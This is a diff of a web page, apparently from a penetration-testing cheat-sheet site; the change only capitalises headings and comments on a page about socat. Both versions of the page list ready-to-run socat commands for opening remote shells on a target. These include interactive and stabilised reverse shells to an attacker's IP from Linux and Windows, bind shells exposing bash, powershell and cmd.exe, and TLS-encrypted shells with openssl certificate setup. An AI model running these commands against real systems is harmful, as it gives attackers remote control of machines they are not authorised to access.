@@ -49,69 +49,69 @@
     <main>
 
     
-    <h1>socat</h1>
+    <h1>Socat</h1>
 
-<h2>fully interactive TTY reverse shell</h2>
+<h2>Fully interactive TTY reverse shell</h2>
 
-<div class="highlight"><pre class="highlight shell"><code><span class="c"># on attack box, run:</span>
+<div class="highlight"><pre class="highlight shell"><code><span class="c"># On attack box, run:</span>
 socat file:<span class="sb">`</span><span class="nb">tty</span><span class="sb">`</span>,raw,echo<span class="o">=</span>0 tcp-listen:4444
 
-<span class="c"># on your target, run:</span>
+<span class="c"># On your target, run:</span>
 socat <span class="nb">exec</span>:<span class="s1">'bash -li'</span>,pty,stderr,setsid,sigint,sane tcp:&lt;ip&gt;:4444
 </code></pre></div>
 
-<h2>reverse shells</h2>
+<h2>Reverse shells</h2>
 
-<div class="highlight"><pre class="highlight shell"><code><span class="c"># basic reverse shell listener</span>
+<div class="highlight"><pre class="highlight shell"><code><span class="c"># Basic reverse shell listener:</span>
 socat TCP-L:&lt;port&gt; -
 
-<span class="c"># connecting to the listener from windows</span>
+<span class="c"># Connecting to the listener from windows:</span>
 socat TCP:&lt;local-ip&gt;:&lt;local-port&gt; EXEC:powershell.exe,pipes
 
-<span class="c"># connecting to the listener from linux</span>
+<span class="c"># Connecting to the listener from linux:</span>
 socat TCP:&lt;local-ip&gt;:&lt;local-port&gt; EXEC:<span class="s2">"bash -li"</span>
 </code></pre></div>
 
-<h2>fully stable reverse shell on linux</h2>
+<h2>Fully stable reverse shell on linux</h2>
 
-<div class="highlight"><pre class="highlight shell"><code><span class="c"># first, set up the following listener</span>
+<div class="highlight"><pre class="highlight shell"><code><span class="c"># First, set up the following listener:</span>
 socat TCP-L:&lt;port&gt; FILE:<span class="sb">`</span><span class="nb">tty</span><span class="sb">`</span>,raw,echo<span class="o">=</span>0
 
-<span class="c"># connect to the listener with your method of choice, netcat etc</span>
-<span class="c"># then, run this command to stabilize your shell</span>
+<span class="c"># Connect to the listener with your method of choice, netcat etc</span>
+<span class="c"># then, run this command to stabilize your shell:</span>
 socat TCP:&lt;attacker-ip&gt;:&lt;attacker-port&gt; EXEC:<span class="s2">"bash -li"</span>,pty,stderr,sigint,setsid,sane
 </code></pre></div>
 
-<h2>bind shells</h2>
+<h2>Bind shells</h2>
 
-<div class="highlight"><pre class="highlight shell"><code><span class="c"># on a linux target</span>
+<div class="highlight"><pre class="highlight shell"><code><span class="c"># On a linux target:</span>
 socat TCP-L:&lt;port&gt; EXEC:<span class="s2">"bash -li"</span>
 
-<span class="c"># on a windows target</span>
+<span class="c"># On a windows target:</span>
 socat TCP-L:&lt;port&gt; EXEC:powershell.exe,pipes
 
-<span class="c"># connecting to the listener from your attack box</span>
+<span class="c"># Connecting to the listener from your attack box:</span>
 socat TCP:&lt;target-ip&gt;:&lt;target-port&gt; -
 </code></pre></div>
 
-<h2>encrypted shells</h2>
+<h2>Encrypted shells</h2>
 
-<div class="highlight"><pre class="highlight shell"><code><span class="c"># first, generate a certificate on your attack box</span>
+<div class="highlight"><pre class="highlight shell"><code><span class="c"># First, generate a certificate on your attack box:</span>
 openssl req <span class="nt">--newkey</span> rsa:2048 <span class="nt">-nodes</span> <span class="nt">-keyout</span> shell.key <span class="nt">-x509</span> <span class="nt">-days</span> 362 <span class="nt">-out</span> shell.crt
 
-<span class="c"># concatenate the two files created</span>
+<span class="c"># Concatenate the two files created:</span>
 <span class="nb">cat </span>shell.key shell.crt <span class="o">&gt;</span> shell.pem
 
-<span class="c"># use the certificate for a reverse shell, set up the listener</span>
+<span class="c"># Use the certificate for a reverse shell, set up the listener:</span>
 socat OPENSSL-LISTEN:&lt;port&gt;,cert<span class="o">=</span>shell.pem,verify<span class="o">=</span>0 -
 
-<span class="c"># then connect back to the listener</span>
+<span class="c"># Then connect back to the listener:</span>
 socat OPENSSL:&lt;local-ip&gt;:&lt;local-port&gt;,verify<span class="o">=</span>0 EXEC:/bin/bash
 
-<span class="c"># or use the certificate for a bind shell, set up the listener on your target</span>
+<span class="c"># Or use the certificate for a bind shell, set up the listener on your target:</span>
 socat OPENSSL-LISTEN:&lt;port&gt;,cert<span class="o">=</span>shell.pem,verify<span class="o">=</span>0 EXEC:cmd.exe,pipes
 
-<span class="c"># then connect from your attack box</span>
+<span class="c"># Then connect from your attack box:</span>
 socat OPENSSL:&lt;target-ip&gt;:&lt;target-port&gt;,verify<span class="o">=</span>0 -
 </code></pre></div>
 
